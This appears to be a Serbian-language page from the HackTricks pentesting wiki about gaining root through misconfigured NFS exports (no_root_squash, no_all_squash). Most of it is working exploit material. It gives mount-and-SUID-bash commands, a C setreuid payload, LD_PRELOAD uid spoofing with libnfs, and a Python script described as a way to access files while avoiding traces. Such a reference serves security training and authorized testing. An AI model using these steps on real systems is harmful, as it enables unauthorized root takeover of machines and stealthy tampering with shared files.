{{#include ../../banners/hacktricks-training.md}}

Pročitajte _ **/etc/exports** _ datoteku, ako pronađete neku direktoriju koja je konfigurisana kao **no_root_squash**, tada možete **pristupiti** toj direktoriji **kao klijent** i **pisati unutar** te direktorije **kao** da ste lokalni **root** mašine.

**no_root_squash**: Ova opcija u suštini daje ovlašćenje root korisniku na klijentu da pristupi datotekama na NFS serveru kao root. I to može dovesti do ozbiljnih bezbednosnih implikacija.

**no_all_squash:** Ovo je slično **no_root_squash** opciji, ali se primenjuje na **ne-root korisnike**. Zamislite, imate shell kao nobody korisnik; proverili ste /etc/exports datoteku; opcija no_all_squash je prisutna; proverite /etc/passwd datoteku; emulirajte ne-root korisnika; kreirajte suid datoteku kao taj korisnik (montiranjem koristeći nfs). Izvršite suid kao nobody korisnik i postanite drugi korisnik.

# Privilege Escalation

## Remote Exploit

Ako ste pronašli ovu ranjivost, možete je iskoristiti:

- **Montiranje te direktorije** na klijentskoj mašini, i **kao root kopiranje** unutar montirane fascikle **/bin/bash** binarnu datoteku i davanje **SUID** prava, i **izvršavanje sa žrtvovane** mašine te bash binarne datoteke.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
- **Montiranje te direktorije** na klijentskoj mašini, i **kao root kopiranje** unutar montirane fascikle našeg kompajliranog payload-a koji će zloupotrebiti SUID dozvolu, dati mu **SUID** prava, i **izvršiti sa žrtvovane** mašine taj binarni fajl (ovde možete pronaći neke [C SUID payload-e](payloads-to-execute.md#c)).
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
## Lokalni Eksploit

> [!NOTE]
> Imajte na umu da ako možete da kreirate **tunel sa vašeg računara na računar žrtve, još uvek možete koristiti Remote verziju da iskoristite ovu eskalaciju privilegija tunelovanjem potrebnih portova**.\
> Sledeći trik se koristi u slučaju da datoteka `/etc/exports` **ukazuje na IP**. U ovom slučaju **nećete moći da koristite** u bilo kom slučaju **remote exploit** i biće potrebno da **zloupotrebite ovaj trik**.\
> Još jedan neophodan uslov za rad eksploata je da **izvoz unutar `/etc/export`** **mora koristiti `insecure` flag**.\
> --_Nisam siguran da li će ovaj trik raditi ako `/etc/export` ukazuje na IP adresu_--

## Osnovne Informacije

Scenario uključuje eksploataciju montiranog NFS dela na lokalnom računaru, koristeći grešku u NFSv3 specifikaciji koja omogućava klijentu da specificira svoj uid/gid, potencijalno omogućavajući neovlašćen pristup. Eksploatacija uključuje korišćenje [libnfs](https://github.com/sahlberg/libnfs), biblioteke koja omogućava falsifikovanje NFS RPC poziva.

### Kompilacija Biblioteke

Koraci za kompilaciju biblioteke mogu zahtevati prilagođavanja u zavisnosti od verzije kernela. U ovom specifičnom slučaju, fallocate syscalls su bili komentarisani. Proces kompilacije uključuje sledeće komande:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
### Sprovođenje Eksploata

Eksploit uključuje kreiranje jednostavnog C programa (`pwn.c`) koji povećava privilegije na root i zatim izvršava shell. Program se kompajlira, a rezultantni binarni fajl (`a.out`) se postavlja na deljenje sa suid root, koristeći `ld_nfs.so` da lažira uid u RPC pozivima:

1. **Kompajlirajte kod eksploata:**

```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```

2. **Postavite eksploat na deljenje i izmenite njegove dozvole lažiranjem uid-a:**

```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```

3. **Izvršite eksploat da dobijete root privilegije:**
```bash
/mnt/share/a.out
#root
```

## Bonus: NFShell za Diskretni Pristup Fajlovima

Kada se dobije root pristup, za interakciju sa NFS deljenjem bez promene vlasništva (da bi se izbegli tragovi), koristi se Python skripta (nfsh.py). Ova skripta prilagođava uid da odgovara onom fajlu koji se pristupa, omogućavajući interakciju sa fajlovima na deljenju bez problema sa dozvolama:
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Pokreni kao:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
{{#include ../../banners/hacktricks-training.md}}
